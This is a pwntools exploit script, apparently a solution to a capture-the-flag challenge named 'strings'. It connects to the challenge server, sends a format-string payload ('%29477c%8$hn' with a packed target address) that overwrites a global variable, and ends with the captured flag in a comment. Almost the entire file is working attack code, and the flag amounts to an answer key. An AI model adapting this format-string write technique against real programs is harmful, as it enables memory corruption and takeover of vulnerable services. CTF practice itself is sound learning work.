#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("strings")


local = False 
if local:
    p = process("./strings")
    gdb.attach(p,'''b*0x401297\nc''')
else:
    p = remote('challs.n00bzunit3d.xyz', 7150)

elf = context.binary = ELF('./strings', checksec=False)

str = 0x404060
payload = b'%29477c%8$hn    ' + p64(str)
p.sendline(payload)
p.interactive()
#n00bz{f0rm4t_5tr1ng5_4r3_th3_b3s7!!!!!}